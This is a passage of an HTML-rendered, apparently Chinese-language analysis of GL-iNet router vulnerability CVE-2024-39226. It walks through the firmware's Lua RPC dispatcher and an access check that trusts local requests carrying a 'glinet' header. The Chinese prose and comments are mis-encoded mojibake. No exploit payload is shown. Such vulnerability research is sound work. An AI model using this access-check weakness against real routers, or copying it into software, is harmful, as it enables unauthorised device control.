punctuation\">(</span>id<span class=\"token punctuation\">,</span> res<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre></pre></td></tr><tr><td data-num=\"119\"></td><td><pre><span class=\"token keyword\">local</span> methods<span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    <span class=\"token punctuation\">[</span><span class=\"token string\">\"challenge\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> rpc_method_challenge<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>    <span class=\"token punctuation\">[</span><span class=\"token string\">\"login\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> rpc_method_login<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>    <span class=\"token punctuation\">[</span><span class=\"token string\">\"logout\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> rpc_method_logout<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>    <span class=\"token punctuation\">[</span><span class=\"token string\">\"alive\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> rpc_method_alive<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>    <span class=\"token punctuation\">[</span><span class=\"token string\">\"call\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> rpc_method_call</pre></td></tr><tr><td data-num=\"125\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token comment\">--RPC æ–¹æ³•ï¼šchallengeã€loginã€logoutã€aliveã€call</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre></pre></td></tr><tr><td data-num=\"127\"></td><td><pre><span class=\"token keyword\">local</span> ok<span class=\"token punctuation\">,</span> json_data <span class=\"token operator\">=</span> <span class=\"token function\">pcall</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> ok <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>    <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">nil</span><span class=\"token punctuation\">,</span> rpc<span class=\"token punctuation\">.</span>ERROR_CODE_PARSE_ERROR<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>    <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre></pre></td></tr><tr><td data-num=\"134\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>json_data<span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token string\">\"table\"</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>    <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">nil</span><span class=\"token punctuation\">,</span> rpc<span class=\"token punctuation\">.</span>ERROR_CODE_PARSE_ERROR<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>    <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre></pre></td></tr><tr><td data-num=\"140\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>json_data<span class=\"token punctuation\">.</span>method<span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token string\">\"string\"</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>    <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>json_data<span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">,</span> rpc<span class=\"token punctuation\">.</span>ERROR_CODE_INVALID_REQUEST<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>    <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre></pre></td></tr><tr><td data-num=\"146\"></td><td><pre><span class=\"token keyword\">if</span> json_data<span class=\"token punctuation\">.</span>params <span class=\"token keyword\">and</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>json_data<span class=\"token punctuation\">.</span>params<span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token string\">\"table\"</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>    <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>json_data<span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">,</span> rpc<span class=\"token punctuation\">.</span>ERROR_CODE_INVALID_REQUEST<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>    <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre></pre></td></tr><tr><td data-num=\"152\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> methods<span class=\"token punctuation\">[</span>json_data<span class=\"token punctuation\">.</span>method<span class=\"token punctuation\">]</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>    <span class=\"token keyword\">local</span> resp <span class=\"token operator\">=</span> rpc<span class=\"token punctuation\">.</span><span class=\"token function\">error_response</span><span class=\"token punctuation\">(</span>json_data<span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">,</span> rpc<span class=\"token punctuation\">.</span>ERROR_CODE_METHOD_NOT_FOUND<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>    <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>methods<span class=\"token punctuation\">[</span>json_data<span class=\"token punctuation\">.</span>method<span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>json_data<span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">,</span> json_data<span class=\"token punctuation\">.</span>params <span class=\"token keyword\">or</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>æ ¹æ® POC è°ƒç”¨çš„æ–¹æ³•ä¸º call</p>\n<p><img data-src=\"/img/GL-iNet-%E8%B7%AF%E7%94%B1%E5%99%A8-CVE-2024-39226/8.png\" alt=\"8\"></p>\n<p>æ‰€ä»¥ç°åœ¨é‡ç‚¹å…³æ³¨ rpc_method_call è¿™ä¸ªåŠŸèƒ½ç±»å‡½æ•°</p>\n<p><img data-src=\"/img/GL-iNet-%E8%B7%AF%E7%94%B1%E5%99%A8-CVE-2024-39226/a.png\" alt=\"a\"></p>\n<p>rpc_method_call è¿›è¡Œå‚æ•°éªŒè¯ã€ä¼šè¯æ£€æŸ¥å’Œ Ubus è°ƒç”¨ï¼š</p>\n<ol>\n<li>ç¡®ä¿ params ä¸­è‡³å°‘ä¸‰ä¸ªå…ƒç´ ä¸”å…ƒç´ ç±»å‹æ­£ç¡®ã€‚</li>\n<li>æ£€æŸ¥ sid æ˜¯å¦æœ‰æ•ˆï¼Œå¹¶é€šè¿‡ rpc.access éªŒè¯è®¿é—®æƒé™ã€‚</li>\n<li>å¦‚æœä¸Šè¿°åˆ¤æ–­å‡é€šè¿‡ï¼Œä½¿ç”¨ rpc.call æ‰§è¡ŒæŒ‡å®šçš„ Ubus å¯¹è±¡å’Œæ–¹æ³•ã€‚</li>\n</ol>\n<p>æ¥ä¸‹æ¥è·Ÿè¿› access å’Œ call æ–¹æ³•</p>\n<figure class=\"highlight lua\"><figcaption data-lang=\"lua\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>M<span class=\"token punctuation\">.</span>session <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">local</span> session <span class=\"token operator\">=</span> ubus<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"gl-session\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"session\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span> sid <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>ctx<span class=\"token punctuation\">.</span>sid <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">local</span> __oui_session <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        is_local <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>var<span class=\"token punctuation\">.</span>remote_addr <span class=\"token operator\">==</span> <span class=\"token string\">\"127.0.0.1\"</span> <span class=\"token keyword\">or</span> ngx<span class=\"token punctuation\">.</span>var<span class=\"token punctuation\">.</span>remote_addr <span class=\"token operator\">==</span> <span class=\"token string\">\"::1\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\">-- is_local ä¸ºæœ¬åœ°</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        remote_addr <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>var<span class=\"token punctuation\">.</span>remote_addr<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        remote_port <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>var<span class=\"token punctuation\">.</span>remote_port</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> session <span class=\"token keyword\">then</span> <span class=\"token keyword\">return</span> __oui_session <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    utils<span class=\"token punctuation\">.</span><span class=\"token function\">update_ngx_session</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/tmp/gl_token_\"</span> <span class=\"token operator\">..</span> ngx<span class=\"token punctuation\">.</span>ctx<span class=\"token punctuation\">.</span>sid<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    session<span class=\"token punctuation\">.</span>remote_addr <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>var<span class=\"token punctuation\">.</span>remote_addr</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    session<span class=\"token punctuation\">.</span>remote_port <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>var<span class=\"token punctuation\">.</span>remote_port</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">return</span> session</pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>M<span class=\"token punctuation\">.</span>access <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span>scope<span class=\"token punctuation\">,</span> entry<span class=\"token punctuation\">,</span> need<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">local</span> headers <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>req<span class=\"token punctuation\">.</span><span class=\"token function\">get_headers</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">local</span> s <span class=\"token operator\">=</span> M<span class=\"token punctuation\">.</span><span class=\"token function\">session</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">local</span> aclgroup <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>aclgroup</pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">if</span> s<span class=\"token punctuation\">.</span>is_local <span class=\"token keyword\">and</span> headers<span class=\"token punctuation\">[</span><span class=\"token string\">\"glinet\"</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token comment\">-- åˆ¤æ–­æ˜¯å¦æœ¬åœ°è¯·æ±‚å¹¶ä¸”ä½¿ç”¨ glinet æœåŠ¡ï¼Œåˆ™é€šè¿‡</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token keyword\">true</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token comment\">-- The admin acl group is always allowed</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">if</span> aclgroup <span class=\"token operator\">==</span> <span class=\"token string\">\"root\"</span> <span class=\"token keyword\">then</span> <span class=\"token keyword\">return</span> <span class=\"token keyword\">true</span> <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> aclgroup <span class=\"token keyword\">or</span> aclgroup <span class=\"token operator\">==</span> <span class=\"token string\">\"\"</span> <span class=\"token keyword\">then</span> <span class=\"token keyword\">return</span> <span class=\"token keyword\">false</span> <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">local</span> perm <span class=\"token operator\">=</span> db<span class=\"token punctuation\">.</span><span class=\"token function\">get_perm</span><span class=\"token punctuation\">(</span>aclgroup<span class=\"token punctuation\">,</span> scope<span class=\"token punctuation\">,</span> entry<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> need <span class=\"token keyword\">then</span> <span class=\"token keyword\">return</span> <span class=\"token keyword\">false</span> <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">if</span> need <span class=\"token operator\">==</span> <span class=\"token string\">\"r\"</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token keyword\">return</span> perm<span class=\"token punctuation\">:</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[r,w]\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token keyword\">nil</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token keyword\">return</span> perm<span class=\"token punctuation\">:</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span>need<span class=\"token punctuation\">)</span> <span class=\"token operator\">~=</span> <span class=\"token keyword\">nil</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>M<span class=\"token punctuation\">.</span>call <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span>object<span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>ngx<span class=\"token punctuation\">.</span>DEBUG<span class=\"token punctuation\">,</span> <span class=\"token string\">\"call: '\"</span><span class=\"token punctuation\">,</span> object<span class=\"token punctuation\">,</span> <span class=\"token string\">\".\"</span><span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">,</span> <span class=\"token string\">\"'\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> objects<span class=\"token punctuation\">[</span>object<span class=\"token punctuation\">]</span> <span class=\"token keyword\">then</span> <span class=\"token comment\">-- å¦‚æœæ²¡æœ‰å±æ€§åŠ è½½å°±ä» /usr/lib/oui-httpd/rpc/ åŠ è½½è„šæœ¬</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token keyword\">local</span> script <span class=\"token operator\">=</span> <span class=\"token string\">\"/usr/lib/oui-httpd/rpc/\"</span> <span class=\"token operator\">..</span> object</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token comment\">-- å¦‚æœè„šæœ¬æ–‡ä»¶å­˜åœ¨ä¸”åŠ è½½æˆåŠŸï¼Œå°†å¯¹è±¡çš„æ–¹æ³•æ³¨å†Œåˆ° objects è¡¨ä¸­ã€‚</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> fs<span class=\"token punctuation\">.</span><span class=\"token function\">access</span><span class=\"token punctuation\">(</span>script<span class=\"token punctuation\">)</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            <span class=\"token comment\">-- å¦‚æœæ— æ³•ä» /usr/lib/oui-httpd/rpc/ ç›®å½•ä¸‹åŠ è½½è„šæœ¬æ–‡ä»¶æˆ–è€…æ‰¾ä¸åˆ°å¯¹è±¡æˆ–æ–¹æ³•ã€‚</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token function\">glc_call</span><span class=\"token punctuation\">(</span>object<span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>            <span class=\"token comment\">-- åˆ™è°ƒç”¨ glc_call æ‰§è¡Œã€‚</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>        <span class=\"token keyword\">local</span> ok<span class=\"token punctuation\">,</span> tb <span class=\"token operator\">=</span> <span class=\"token function\">pcall</span><span class=\"token punctuation\">(</span>dofile<span class=\"token punctuation\">,</span> script<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> ok <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>            ngx<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>ngx<span class=\"token punctuation\">.</span>ERR<span class=\"token punctuation\">,</span> tb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token function\">glc_call</span><span class=\"token punctuation\">(</span>object<span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>tb<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"table\"</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>            <span class=\"token keyword\">local</span> funs <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>            <span class=\"token keyword\">for</span> k<span class=\"token punctuation\">,</span> v <span class=\"token keyword\">in</span> <span class=\"token function\">pairs</span><span class=\"token punctuation\">(</span>tb<span class=\"token punctuation\">)</span> <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token function\">type</span><span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"function\"</span> <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>                    funs<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> v</pre></td></tr><tr><td data-num=\"70\"></td><td><pre>                <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>            <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>            objects<span class=\"token punctuation\">[</span>object<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> funs</pre></td></tr><tr><td data-num=\"73\"></td><td><pre>        <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token keyword\">local</span> fn <span class=\"token operator\">=</span> objects<span class=\"token punctuation\">[</span>object<span class=\"token punctuation\">]</span> <span class=\"token keyword\">and</span> objects<span class=\"token punctuation\">[</span>object<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>method<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> fn  <span class=\"token keyword\">then</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">glc_call</span><span class=\"token punctuation\">(</span>object<span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">fn</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre><span class=\"token keyword\">local</span> <span class=\"token keyword\">function</span> <span class=\"token function\">glc_call</span><span class=\"token punctuation\">(</span>object<span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    ngx<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>ngx<span class=\"token punctuation\">.</span>DEBUG<span class=\"token punctuation\">,</span> <span class=\"token string\">\"call C: '\"</span><span class=\"token punctuation\">,</span> object<span class=\"token punctuation\">,</span> <span class=\"token string\">\".\"</span><span class=\"token punctuation\">,</span> method<span class=\"token punctuation\">,</span> <span class=\"token string\">\"'\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    <span class=\"token comment\">-- æŸ¥çœ‹ /usr/lib/oui-httpd/rpc/ ç›®å½•ä¸‹æ˜¯äºŒè¿›åˆ¶ s2s.so æ–‡ä»¶ï¼Œ</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token comment\">-- æ— æ³•ç›´æ¥åŠ è½½ï¼Œåˆ™é€šè¿‡ glc_call è°ƒç”¨ /cgi-bin/glc æ‰§è¡Œ C ç¨‹åºå®ç°çš„ RPC æ–¹æ³•ã€‚</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    <span class=\"token keyword\">local</span> res <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span><span class=\"token function\">capture</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/cgi-bin/glc\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>        method <span class=\"token operator\">=</span> ngx<span class=\"token punctuation\">.</span>HTTP_POST<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>        body <span class=\"token operator\">=</span> cjson<span class=\"token punctuation\">.</span><span class=\"token function\">encode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>            object <span class=\"token operator\">=</span> object<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>            method <span class=\"token operator\">=</span> method<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>            args <span class=\"token operator\">=</span> args <span class=\"token keyword\">or</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>    <span class=\"token keyword\">if</span> res<span class=\"token punctuation\">.</span>status <span class=\"token operator\">~=</span> ngx<span class=\"token punctuation\">.</span>HTTP_OK <span class=\"token keyword\">then</span> <span class=\"token keyword\">return</span> M<span class=\"token punctuation\">.</span>ERROR_CODE_INTERNAL_ERROR <span class=\"token keyword\">end</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>    <span class=\"token keyword\">local</span> body <span class=\"token 